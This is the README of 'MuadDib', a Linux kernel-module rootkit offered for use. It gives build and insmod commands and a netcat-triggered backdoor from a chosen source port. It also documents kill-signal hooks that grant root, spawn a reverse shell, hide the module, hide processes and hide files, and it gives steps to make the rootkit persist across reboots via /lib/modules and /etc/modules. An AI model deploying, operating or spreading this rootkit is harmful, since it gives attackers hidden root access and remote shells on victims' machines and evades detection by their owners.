# MuadDib
Linux Kernel Module (LKM) Rootkit that works with linux kernel versions 5.13 and (hopefully) below.

## Installation
Just run the Makefile and insert the module.
```
make
insmod muadDib.ko
```
## Usage
### Accept Backdoor
To remotely get a shell, send a request from a specified source port (default 1337)
```
nc xxx.xxx.xxx.xxx 22 -p 1337
```
### Get root
When on the machine, root can be acquired via kill hook
```
kill -64 9999
```
Any PID works
### Spawn reverse shell
Also works using kill hook
```
kill -42 9999
```
### Hide muadDib LKM
Again, using kill
```
kill -43 9999
```
When hidden, running this again will show it
### Hide Process
```
kill -44 [PID to hide]
```
### Hide files
All files containing PREFIX [default MUADDIB] are hidden
### Misc
There is also a mkdir and execve hook just as a POC, have not found a use yet.

### Persistence
Copy muadDib.ko to /lib/modules/$(uname -r)/kernel/drivers/ 
echo muadDib to /etc/modules
sudo depmod 

## Tested on
Ubuntu 20.04.1 x86_64 Linux 5.13.0

## Resources/References:
	https://xcellerator.github.io/
	https://github.com/xcellerator/linux_kernel_hacking
	https://github.com/ilammy/ftrace-hook
	https://github.com/h3xduck/Umbra
